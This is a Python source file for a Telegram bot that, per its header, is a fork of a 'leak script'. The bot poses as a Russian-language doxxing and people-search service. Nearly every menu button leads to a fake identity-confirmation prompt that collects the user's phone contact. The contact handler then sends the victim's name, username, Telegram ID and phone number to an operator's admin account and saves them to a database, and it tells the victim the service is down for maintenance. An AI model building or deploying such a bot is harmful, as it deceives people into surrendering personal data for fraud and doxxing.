"""
Fork from leak script @end_soft (https://t.me/End_Soft/4654)
forked by fairet
fairet (author fork) hasn't responsibility for your actions
"""

import telebot
from telebot import types
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import json
import sqlite3


def parse(setting):
    """Parsing 'setting' from config.json"""
    with open ('config.json', 'r') as file:
        data = json.load(file)
        
    return data["config"][setting]

def add_to_database(number, user_id):
    """Adding number and user_id to databse from config.json"""

    connection = sqlite3.connect(parse("database"))
    cursor = connection.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS numbers (
            id INTEGER PRIMARY KEY,
            number INTEGER,
            user_id INTEGER
        )
    ''')

    cursor.execute('INSERT INTO numbers (number, user_id) VALUES (?, ?)', (number, user_id))

    connection.commit()
    connection.close()
	  
text_phone_number = """üóÇ *–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞*

–í–∞–º –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ *–ø–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞* –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã *–∑–∞–≤–µ—Ä—à–∏—Ç—å –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é*.

*–î–ª—è —ç—Ç–æ–≥–æ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.*"""

bot = telebot.TeleBot(parse("api_token"))

find_menu = types.InlineKeyboardMarkup()
button0 = types.InlineKeyboardButton('üîé–ù–∞—á–∞—Ç—å –ø–æ–∏—Å–∫', callback_data="start_dox")
find_menu.row(button0)
button1 = types.InlineKeyboardButton('‚öôÔ∏è–ê–∫–∫–∞—É–Ω—Ç', callback_data="dox")
button2 = types.InlineKeyboardButton('üÜò–ü–æ–¥–¥–µ—Ä–∂–∫–∞',callback_data="dox")
find_menu.row(button1,button2)
button3 = types.InlineKeyboardButton('ü§ñ–°–æ–∑–¥–∞—Ç—å —Å–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –±–æ—Ç',callback_data="dox")
find_menu.row(button3)
button4 = types.InlineKeyboardButton('ü§ù–ü–∞—Ä—Ç–Ω–µ—Ä—Å–∫–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞',callback_data="dox")
find_menu.row(button4)

@bot.message_handler(commands=['start'])
def start(message):
    """Sending start messages"""
    bot.send_message(message.from_user.id,"*–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!*",parse_mode="Markdown")
    bot.send_message(message.from_user.id,"*–í—ã–±–µ—Ä–∏—Ç–µ –Ω—É–∂–Ω–æ–µ –¥–µ–π—Å—Ç–≤–∏–µ:*",parse_mode="Markdown",reply_markup=find_menu)

@bot.callback_query_handler(func=lambda call: call.data == "start_dox")
def button0_pressed(call: types.CallbackQuery):
	"""Sending """
	bot.send_message(chat_id=call.message.chat.id,text= "üë§ –ü–æ–∏—Å–∫ –ø–æ –∏–º–µ–Ω–∏\n"+\
											"‚îú  `–ë–ª–æ–≥–µ—Ä` _(–ü–æ–∏—Å–∫ –ø–æ —Ç–µ–≥—É)_\n"\
											"‚îú  `–ê–Ω—Ç–∏–ø–æ–≤ –ï–≤–≥–µ–Ω–∏–π –í—è—á–µ—Å–ª–∞–≤–æ–≤–∏—á`\n"\
											"‚îî  `–ê–Ω—Ç–∏–ø–æ–≤ –ï–≤–≥–µ–Ω–∏–π –í—è—á–µ—Å–ª–∞–≤–æ–≤–∏—á 05.02.1994`\n"\
											"_(–î–æ—Å—Ç—É–ø–Ω—ã —Ç–∞–∫–∂–µ —Å–ª–µ–¥—É—é—â–∏–µ —Ñ–æ—Ä–º–∞—Ç—ã_ "+"`05.02`"+"_/_"+"`1994`"+"_/_"+"`28`"+"_/_"+"`20-28`"+"_)_\n\n"\
											"üöó –ü–æ–∏—Å–∫ –ø–æ –∞–≤—Ç–æ\n"\
											"‚îú  `–ù777–û–ù777` - –ø–æ–∏—Å–∫ –∞–≤—Ç–æ –ø–æ *–†–§*\n"\
											"‚îî  `–•–¢–ê21150053965897` - –ø–æ–∏—Å–∫ –ø–æ *VIN*\n\n"\
											"üë® *–°–æ—Ü–∏–∞–ª—å–Ω—ã–µ —Å–µ—Ç–∏*\n"\
											"‚îú  `https://www.instagram.com/violetta_orlova` - *Instagram*\n"\
											"‚îú  `https://vk.com/id577744097` - *–í–∫–æ–Ω—Ç–∞–∫—Ç–µ*\n"\
											"‚îú  `https://facebook.com/profile.php?id=1` - *Facebook*\n"\
											"‚îî  `https://ok.ru/profile/162853188164` - *–û–¥–Ω–æ–∫–ª–∞—Å—Å–Ω–∏–∫–∏*\n\n"\
											"üì± `79999939919` - –¥–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ *–Ω–æ–º–µ—Ä—É —Ç–µ–ª–µ—Ñ–æ–Ω–∞*\n"\
											"üì® `tema@gmail.com` - –¥–ª—è –ø–æ–∏—Å–∫–∞ –ø–æ *Email*\n"\
   										    "üìß `#281485304`, `@durov` –∏–ª–∏ `–ø–µ—Ä–µ—à–ª–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ` - –ø–æ–∏—Å–∫ –ø–æ *Telegram* –∞–∫–∫–∞—É–Ω—Ç—É\n\n"\
											"üîê `/pas churchill7` - –ø–æ–∏—Å–∫ –ø–æ—á—Ç—ã, –ª–æ–≥–∏–Ω–∞ –∏ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ *–ø–æ –ø–∞—Ä–æ–ª—é*\n"\
											"üèö `/adr –ú–æ—Å–∫–≤–∞, –¢–≤–µ—Ä—Å–∫–∞—è, –¥ 1, –∫–≤ 1` - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –ø–æ –∞–¥—Ä–µ—Å—É (–†–§)\n"\
											"üèò `77:01:0001075:1361` - –ø–æ–∏—Å–∫ –ø–æ *–∫–∞–¥–∞—Å—Ç—Ä–æ–≤–æ–º—É –Ω–æ–º–µ—Ä—É*\n\n"\
											"üèõ `/company –°–±–µ—Ä–±–∞–Ω–∫` - –ø–æ–∏—Å–∫ –ø–æ *—é—Ä –ª–∏—Ü–∞–º*\n"\
											"üìë `/inn 784806113663` - –ø–æ–∏—Å–∫ –ø–æ *–ò–ù–ù*\n"\
											"üé´ `/snils 13046964250` - –ø–æ–∏—Å–∫ –ø–æ *–°–ù–ò–õ–°*\n\n"\
											"üì∏ –û—Ç–ø—Ä–∞–≤—å—Ç–µ *—Ñ–æ—Ç–æ —á–µ–ª–æ–≤–µ–∫–∞*, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ –µ–≥–æ –∏–ª–∏ –¥–≤–æ–π–Ω–∏–∫–∞ –Ω–∞ —Å–∞–π—Ç–∞—Ö *–í–ö*, *–û–ö*.\n"\
											"üöô –û—Ç–ø—Ä–∞–≤—å—Ç–µ *—Ñ–æ—Ç–æ –Ω–æ–º–µ—Ä–∞ –∞–≤—Ç–æ–º–æ–±–∏–ª—è*, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –æ –Ω–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é.\n"\
											"üôÇ –û—Ç–ø—Ä–∞–≤—å—Ç–µ *—Å—Ç–∏–∫–µ—Ä*, —á—Ç–æ–±—ã –Ω–∞–π—Ç–∏ *—Å–æ–∑–¥–∞—Ç–µ–ª—è*.\n"\
											"üåé –û—Ç–ø—Ä–∞–≤—å—Ç–µ *—Ç–æ—á–∫—É –Ω–∞ –∫–∞—Ä—Ç–µ*, —á—Ç–æ–±—ã *–Ω–∞–π—Ç–∏ –ª—é–¥–µ–π*, –∫–æ—Ç–æ—Ä—ã–µ —Å–µ–π—á–∞—Å —Ç–∞–º.\n"\
											"üó£ –° –ø–æ–º–æ—â—å—é *–≥–æ–ª–æ—Å–æ–≤—ã—Ö –∫–æ–º–∞–Ω–¥* —Ç–∞–∫–∂–µ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω—è—Ç—å *–ø–æ–∏—Å–∫–æ–≤—ã–µ –∑–∞–ø—Ä–æ—Å—ã*.",parse_mode="Markdown")

send = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
button_phone = types.KeyboardButton(text="‚úÖ–ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å", request_contact=True)
send.add(button_phone)

@bot.callback_query_handler(func=lambda call: call.data == "dox")
def button1_pressed(call: types.CallbackQuery):
    # Call back when pressed any button
	bot.send_message(chat_id=call.message.chat.id,text=text_phone_number,parse_mode="Markdown",reply_markup=send)

@bot.message_handler(content_types=['contact']) 
def contact(message):
    """Sending logs to admin_id if contact isn't None"""
    if message.contact is not None:
        bot.send_message(parse("admin_id"),"*üîî–ù–æ–≤—ã–π –ª–æ–≥!*\n"+\
        	"–ò–º—è: `"+message.from_user.first_name+\
        	"\n`–õ–æ–≥–∏–Ω: @"+message.from_user.username+\
            f"\n–ê–π–¥–∏: {message.from_user.id}"
        	"\n–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: `"+message.contact.phone_number+"`",parse_mode="Markdown")
        add_to_database(message.contact.phone_number, message.from_user.id)
        bot.send_message(parse("admin_id",f'*–î–∞–Ω–Ω—ã–µ –∑–∞–ø–∏—Å–∞–Ω—ã –≤ {parse("database")}*'), parse_mode="Markdown")
        bot.send_message(message.from_user.id,"*‚ö†Ô∏è –¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ —Ä–∞–±–æ—Ç—ã –¥–æ 05:00 –ø–æ –º—Å–∫.*\n\n–†–∞–±–æ—Ç—ã –±—É–¥—É—Ç –∑–∞–≤–µ—Ä—à–µ–Ω—ã –≤ –¥–∞–Ω–Ω—ã–π –ø—Ä–æ–º–µ–∂—É—Ç–æ–∫ –≤—Ä–µ–º–µ–Ω–∏, –≤—Å–µ –ø–æ–¥–ø–∏—Å–∫–∏ –ø—Ä–æ–¥–ª–µ–Ω—ã.",parse_mode="Markdown",reply_markup=types.ReplyKeyboardRemove())
        
@bot.message_handler(content_types=['text'])
def handler(message):
	"""Always sending confirm number paste"""
	bot.send_message(message.from_user.id, text_phone_number, parse_mode="Markdown", reply_markup=send)

bot.polling(none_stop=True)